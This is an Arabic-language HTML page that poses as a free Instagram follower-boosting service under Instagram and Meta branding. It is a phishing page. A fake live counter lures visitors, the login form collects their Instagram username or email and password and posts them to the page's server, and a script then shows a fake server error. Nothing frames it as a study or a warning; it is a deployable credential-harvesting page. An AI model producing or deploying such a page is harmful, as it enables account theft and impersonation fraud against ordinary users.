<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>زيادة متابعين إنستقرام مجاناً 2026 | Instagram Followers Free</title>
    <meta name="description" content="أفضل موقع لزيادة متابعين إنستقرام حقيقيين مجاناً. احصل على 1000 متابع يومياً بدون برامج.">
    <meta name="keywords" content="زيادة متابعين, انستقرام, متابعين مجانا, توثيق حسابات, Instagram followers">
    
    <style>
        body { background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }
        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 320px; text-align: center; }
        .logo { width: 50px; margin-bottom: 10px; }
        h1 { font-size: 16px; color: #262626; margin-bottom: 15px; }
        .live-counter { background: #fff5f5; color: #ed4956; padding: 5px; font-size: 12px; border-radius: 5px; margin-bottom: 15px; font-weight: bold; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .error-msg { color: #ed4956; font-size: 12px; margin-top: 10px; display: none; }
        .footer-meta { margin-top: 20px; font-size: 11px; color: #8e8e8e; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="logo">
        <h1>نظام زيادة المتابعين التلقائي</h1>
        <div class="live-counter">🔥 يوجد الآن 482 مستخدم يحصلون على متابعين</div>
        
        <form id="loginForm" action="/" method="POST">
            <input type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit" onclick="showError()">تحقق واستلام المتابعين</button>
            <div id="error" class="error-msg">عذراً، حدث خطأ في الخادم. يرجى المحاولة مرة أخرى.</div>
        </form>

        <div class="footer-meta">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" width="40"><br>
            © 2026 Instagram from Meta
        </div>
    </div>

    <script>
        function showError() {
            // كود وهمي لإظهار رسالة خطأ بعد الضغط (اختياري)
            setTimeout(() => { document.getElementById('error').style.display = 'block'; }, 1000);
        }
    </script>
</body>
</html>
